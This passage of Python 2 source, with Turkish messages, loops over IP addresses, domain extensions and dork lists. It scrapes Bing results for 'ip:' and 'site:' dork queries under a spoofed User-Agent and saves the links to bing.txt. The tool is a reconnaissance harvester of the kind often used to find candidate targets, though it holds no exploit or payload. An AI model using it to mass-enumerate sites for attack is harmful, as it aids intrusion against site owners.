				url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
				headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
				rq=requests.session()
				rq.headers.update(headers)
				res=rq.get(url)
				rm=res.content
				soup = BeautifulSoup(rm,'html.parser')
				dex= soup.find_all('h2')
			
				for ia in dex:
					l=ia.find_all('a')
					sokup=BeautifulSoup(str(l),"html.parser")
					for ij in sokup.find_all("a"):
						 p= ij.get('href')
						 print p
						 bingcom=open("bing.txt","a")
						 bingcom.write(p+"\n")
						 bingcom.close()
				bitis= datetime.datetime.now()
				gecen(baslangic,bitis)
				dduz()
				print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			dorkli=open(dorklistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in dorkli:
				drk=i.replace("\n","")
				print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
				
				sit="ip:"+iparama+"+"+drk
				for ig in range (sayfa):
					try:
						syfa=ig*10+1
						pere=ig+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
						time.sleep(zaman)
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
			kaynak=[]
			karsilastirma=[]
			sonduzen=[]
		if sayfa >=3:
			dorkli=open(dorklistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in dorkli:
				drk=i.replace("\n","")
				print renkler.kirmizi+"%s sayfa  cekiliyor."%(sayfa)+renkler.beyaz
				sit="ip:"+iparama+"+"+drk
				time.sleep(zaman)
				for ig in range (sayfa):
					try:
						syfa=ig*10+1
						pere=ig+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
						time.sleep(zaman)
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
							print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
			kaynak=[]
			karsilastirma=[]
			sonduzen=[]
	if iplistesi!=None and dork!=None and dorklistesi ==None:
		if sayfa ==1:
			sitelist=open(iplistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				time.sleep(zaman)
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s ip icin toplam %s sayfada arama baslatildi."%(siteli,sayfa)+renkler.beyaz
				sit="ip:"+siteli+"+"+dork
				print sit
				url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
				headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
				rq=requests.session()
				rq.headers.update(headers)
				res=rq.get(url)
				rm=res.content
				soup = BeautifulSoup(rm,'html.parser')
				dex= soup.find_all('h2')
				for ia in dex:
					l=ia.find_all('a')
					sokup=BeautifulSoup(str(l),"html.parser")
					for ij in sokup.find_all("a"):
						 p= ij.get('href')
						 print p
						 bingcom=open("bing.txt","a")
						 bingcom.write(p+"\n")
						 bingcom.close()
				bitis= datetime.datetime.now()
				gecen(baslangic,bitis)
				dduz()
				print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
				kaynak=[]
				karsilastirma=[]
				sonduzen=[]
		if sayfa ==2:
			sitelist=open(iplistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s ip icin toplam %s sayfada arama baslatildi. ki"%(siteli,sayfa)+renkler.beyaz
				sit="ip:"+siteli+"+"+dork
				for ig in range (sayfa):
					try:
						time.sleep(zaman)
						syfa=ig*10+1
						pere=ig+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
						print url
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			sitelist=open(iplistesi,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s ip icin toplam %s sayfada arama baslatildi."%(siteli,sayfa)+renkler.beyaz
				sit="ip:"+siteli+"+"+dork
				for ig in range (sayfa):
					try:
						syfa=ig*10+1
						pere=ig+1
						time.sleep(zaman)
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
		bitis= datetime.datetime.now()
		gecen(baslangic,bitis)
		dduz();
		print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if iplistesi !=None and dorklistesi!=None and dork ==None:
		if sayfa == 1:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(iplistesi,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					time.sleep(zaman)
					drk=j.replace("\n","")
					sit="ip:"+sitel+"+"+drk
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
					url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(iplistesi,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					time.sleep(zaman)
					drk=j.replace("\n","")
					sit="ip:"+sitel+"+"+drk
					for sy in range(sayfa):
						try:
							syfa=sy*10+1
							print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
							url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE"%(sit,sit,syfa)
							headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
							rq=requests.session()
							rq.headers.update(headers)
							res=rq.get(url)
							rm=res.content
							soup = BeautifulSoup(rm,'html.parser')
							dex= soup.find_all('h2')
							for ia in dex:
								l=ia.find_all('a')
								sokup=BeautifulSoup(str(l),"html.parser")
								for ij in sokup.find_all("a"):
									 p= ij.get('href')
									 print p
									 bingcom=open("bing.txt","a")
									 bingcom.write(p+"\n")
									 bingcom.close()
						except requests.exceptions.ConnectionError:
							print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
							continue
						except requests.exceptions.Timeout:
							print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except requests.exceptions.TooManyRedirects:
							print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except urllib2.URLError:
							print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
							continue
						except urllib2.HTTPError:
							print renkler.kirmizi+"baglanmadi"+renkler.beyaz
							continue
						except socket.error:
							print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
							continue
						except httplib.BadStatusLine:
							print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
							continue
			bitis = datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(iplistesi,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					print renkler.kirmizi+"%s sayfa  cekiliyor."%(sayfa)+renkler.beyaz
					drk=j.replace("\n","")
					sit="ip:"+sitel+"+"+drk
					for sy in range(sayfa):
						try:
							time.sleep(zaman)
							syfa=sy*10+1
							pere=sy+1
							print renkler.kirmizi+"%s ip icin %s dorku araniyor.\n%s. sayfa okunuyor veriler cekiliyor."%(sitel,drk,pere)+renkler.beyaz
							url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s"%(sit,sit,syfa,pere)
							headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
							rq=requests.session()
							rq.headers.update(headers)
							res=rq.get(url)
							rm=res.content
							soup = BeautifulSoup(rm,'html.parser')
							dex= soup.find_all('h2')
							for ia in dex:
								l=ia.find_all('a')
								sokup=BeautifulSoup(str(l),"html.parser")
								for ij in sokup.find_all("a"):
									 p= ij.get('href')
									 print p
									 bingcom=open("bing.txt","a")
									 bingcom.write(p+"\n")
									 bingcom.close()
						except requests.exceptions.ConnectionError:
							print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
							continue
						except requests.exceptions.Timeout:
								print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
								continue
						except requests.exceptions.TooManyRedirects:
							print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except urllib2.URLError:
								print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
								continue
						except urllib2.HTTPError:
									print renkler.kirmizi+"baglanmadi"+renkler.beyaz
									continue
						except socket.error:
								print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
								continue
						except httplib.BadStatusLine:
							print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
							continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if uzantilar!=None and dork!=None:
		if sayfa ==1:
			sitelist=open(uzantilar,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				time.sleep(zaman)
				siteli=i.replace("\n","")
				sit="site:"+siteli+"+"+dork
				
				url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
				headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
				rq=requests.session()
				rq.headers.update(headers)
				res=rq.get(url)
				rm=res.content
				soup = BeautifulSoup(rm,'html.parser')
				dex= soup.find_all('h2')
				for ia in dex:
					l=ia.find_all('a')
					sokup=BeautifulSoup(str(l),"html.parser")
					for ij in sokup.find_all("a"):
						 p= ij.get('href')
						 print p
						 bingcom=open("bing.txt","a")
						 bingcom.write(p+"\n")
						 bingcom.close()
				bitis= datetime.datetime.now()
				gecen(baslangic,bitis)
				dduz()
				print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			sitelist=open(uzantilar,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s uzantisi icin %s  sayfa cekiliyor "%(siteli,sayfa)+renkler.beyaz
				sit="site:"+siteli+"+"+dork
				for ig in range (sayfa):
					try:
						time.sleep(zaman)
						syfa=ig*10+1
						pere=ig+1
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE" %(sit,sit,syfa)
						
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			sitelist=open(uzantilar,"r").readlines()
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			for i in sitelist:
				siteli=i.replace("\n","")
				print renkler.kirmizi+"%s sayfa cekilecek"%(sayfa)+renkler.beyaz
				print siteli
				sit="site:"+siteli+"+"+dork
				for ig in range (sayfa):
					try:
						syfa=ig*10+1
						pere=ig+1
						time.sleep(zaman)
						print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(pere)+renkler.beyaz
						url="http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s" %(sit,sit,syfa,pere)
						headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
						rq=requests.session()
						rq.headers.update(headers)
						res=rq.get(url)
						rm=res.content
						soup = BeautifulSoup(rm,'html.parser')
						dex= soup.find_all('h2')
						for ia in dex:
							l=ia.find_all('a')
							sokup=BeautifulSoup(str(l),"html.parser")
							for ij in sokup.find_all("a"):
								 p= ij.get('href')
								 print p
								 bingcom=open("bing.txt","a")
								 bingcom.write(p+"\n")
								 bingcom.close()
					except requests.exceptions.ConnectionError:
						print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
						continue
					except requests.exceptions.Timeout:
						print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except requests.exceptions.TooManyRedirects:
						print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
						continue
					except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
					except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
					except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
					except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
	if uzantilar!=None and dorklistesi!=None:
		if sayfa == 1:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(uzantilar,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					time.sleep(zaman)
					drk=j.replace("\n","")
					sit="site:"+sitel+"+"+drk
					print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
					url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=1&FORM=PERE"%(sit,sit)
					headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
					rq=requests.session()
					rq.headers.update(headers)
					res=rq.get(url)
					rm=res.content
					soup = BeautifulSoup(rm,'html.parser')
					dex= soup.find_all('h2')
					for ia in dex:
						l=ia.find_all('a')
						sokup=BeautifulSoup(str(l),"html.parser")
						for ij in sokup.find_all("a"):
							 p= ij.get('href')
							 print p
							 bingcom=open("bing.txt","a")
							 bingcom.write(p+"\n")
							 bingcom.close()
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa ==2:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(uzantilar,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					time.sleep(zaman)
					drk=j.replace("\n","")
					sit="site:"+sitel+"+"+drk
					for sy in range(sayfa):
						try:
							syfa=sy*10+1
							print renkler.kirmizi+"%s uzantisi icin ve %s dorku icin %s sayfa cekilecek"%(sitel,drk,sayfa)+renkler.beyaz
							url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE"%(sit,sit,syfa)
							headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
							rq=requests.session()
							rq.headers.update(headers)
							res=rq.get(url)
							rm=res.content
							soup = BeautifulSoup(rm,'html.parser')
							dex= soup.find_all('h2')
							for ia in dex:
								l=ia.find_all('a')
								sokup=BeautifulSoup(str(l),"html.parser")
								for ij in sokup.find_all("a"):
									 p= ij.get('href')
									 print p
									 bingcom=open("bing.txt","a")
									 bingcom.write(p+"\n")
									 bingcom.close()
						except requests.exceptions.ConnectionError:
							print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
							continue
						except requests.exceptions.Timeout:
							print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except requests.exceptions.TooManyRedirects:
							print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except urllib2.URLError:
							print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
							continue
						except urllib2.HTTPError:
							print renkler.kirmizi+"baglanmadi"+renkler.beyaz
							continue
						except socket.error:
							print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
							continue
						except httplib.BadStatusLine:
							print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
							continue
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
			dduz()
			print renkler.yesil+"------ Sonuclar bing.txt kayit edildi ------"+renkler.beyaz
		if sayfa >=3:
			bingcom=open("bing.txt","w")
			bingcom.close()
			baslangic= datetime.datetime.now()
			siteli=open(uzantilar,"r").readlines()
			dorkli= open(dorklistesi,"r").readlines()
			for i in siteli:
				sitel=i.replace("\n","")
				for j in dorkli:
					print renkler.kirmizi+"%s sayfa cekiliyor."%(sayfa)+renkler.beyaz
					drk=j.replace("\n","")
					sit="site:"+sitel+"+"+drk
					for sy in range(sayfa):
						try:
							time.sleep(zaman)
							syfa=sy*10+1
							pere=sy+1
							print renkler.kirmizi+"%s. sayfa okunuyor veriler cekiliyor."%(sayfa)+renkler.beyaz
							url = "http://www.bing.com/search?q=%s&qs=n&sp=-1&pq=%s&sk=&cvid=38D8F44FEEE4476B9F3AF5691BDFA296&first=%s&FORM=PERE%s"%(sit,sit,syfa,pere)
							headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
							rq=requests.session()
							rq.headers.update(headers)
							res=rq.get(url)
							rm=res.content
							soup = BeautifulSoup(rm,'html.parser')
							dex= soup.find_all('h2')
							for ia in dex:
								l=ia.find_all('a')
								sokup=BeautifulSoup(str(l),"html.parser")
								for ij in sokup.find_all("a"):
									 p= ij.get('href')
									 print p
									 bingcom=open("bing.txt","a")
									 bingcom.write(p+"\n")
									 bingcom.close()
						except requests.exceptions.ConnectionError:
							print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
							continue
						except requests.exceptions.Timeout:
							print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except requests.exceptions.TooManyRedirects:
							print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
							continue
						except urllib2.URLError:
							print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
							continue
						except urllib2.HTTPError:
							print renkler.kirmizi+"baglanmadi"+renkler.beyaz
							continue
						except socket.error:
							print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
							continue
						except httplib.BadStatusLine:
							print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
							continue
			bitis= datetime.datetime.now()
